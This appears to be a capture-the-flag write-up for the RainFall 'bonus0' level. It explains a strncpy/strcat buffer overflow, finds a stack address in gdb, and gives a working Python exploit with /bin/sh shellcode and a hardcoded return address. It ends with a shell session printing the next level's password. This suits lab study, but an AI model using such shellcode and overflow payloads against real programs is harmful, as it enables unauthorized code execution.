Here, we need to change the return address, to execute some code.

1. Issues in the code
What we can see is that the `str` is 42 bytes long.

The `p` function read too much bytes compared to what it needs,
and does not terminate with `\0` the string that it just read.

Then, it'll `strncpy` the input buffer into a temporary `str2` variable.

That variable limited to 20 caracters will receive a non-null terminated string into it.
`strncpy` will not add at the end of the string the `\0` itself.

Then, we have the same thing again with the `str3` variable.

After that, we are calling: `strcpy(str, str2);`.

This is interesting because in memory, the `str2` is literraly equals to 2 times 20 bytes of data,
were the 20 first bytse are the "real" str2, and the 20 last are the "real" str3.

So at that point, `str` will hold 40 bytes.

```c
char *end = (str + strlen(str));
*end = ' ';
*(end + 1) = 0;
```
Then, it'll replace the `\0` by a space, and add another `\0` character.

At the end, it'll `strcat` again, to `str` the content of `str3`.

Which means that'll have at the end 61 bytes, in a 42 bytes allocation.:
`[str2 - 20B][str3 - 20B][' '][str3 - 20B]\0`

2. Possibilities:
It's "not large enough" to do a `ret2libc`, because:

The `str3` had to begin with 9 bytes of padding to compensate the
8 bytes of stack alignment at the start of the program, and one byte to
fill the 42-bytes long stack allocation of `str`.

Then, we need 4 bytes for the `system` function address.
4 bytes for the fake return address.
And finally, 4 bytes for the `/bin/sh`.

Factually, this means 12 bytes for the attack, and 9 bytes of padding,
so 21 bytes on the 20 that we can set.

We could have tried adding an `\0` from `strcat` to `str`,
which would have saved us 1 byte, but none of str's addresses are aligned to 256.

So, we need to set a shell code in our `buff` of the `p` function.

3. Locate the good `buff` address:

So as mentionned earlier, we need to have:
`[padding - 9B][return address - 4B]`
So 15 bytes more than `buff` location. But to avoid bad alignment, we'll add more NOP byte.

To get the `buff` address, we can do:
```
(gdb) set disassembly-flavor intel 
(gdb) disas p
[...]
   0x080484d6 <+34>:    mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:    mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:    call   0x8048380 <read@plt>
[...]
```
So the address is stored in `eax`.

```
(gdb) b *p + 34
Breakpoint 1 at 0x80484d6
(gdb) r
Breakpoint 1, 0x080484d6 in p ()
(gdb) x/x $eax
0xbfffe680:     0x00000000
```

The `buff` address is `0xbfffe680`, and we need to point: `0xbfffe690`.

3. Exploit:

We'll take again the shell code from the previous exersise.
We need the 9 bytes padding first, then the shell code address,
then 4 bytes for the return address, and 3 bytes to
fill the missing space and align our memory.

Because of some weird protection, I had to add 8 bytes more than
what I was expecting for. Probably because of the stack aligment.

Then we put the shell code, and pad the rest.

```py
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f" \
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd" \
"\x80"

shellcode_address = "\x9c\xe6\xff\xbf"

print("A" * 4095)
print("\x90" * 9 + shellcode_address + "\x90" * (7+8) + shellcode + "\x90" * (4095 - 9 - 4 - 7 - 8 - len(shellcode)))
```

> Be aware of having the same amount of environment variables as in `gdb`
> when you use the exploit.
> You can use the `script.sh` provided.

```sh
bonus0@RainFall:~$ (python /tmp/exploit2.py; cat -) | ./bonus0 
 - 
 - 
AAAAAAAAAAAAAAAAAAAA����������������������� �����������������������
cd ../bonus1
cat .pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```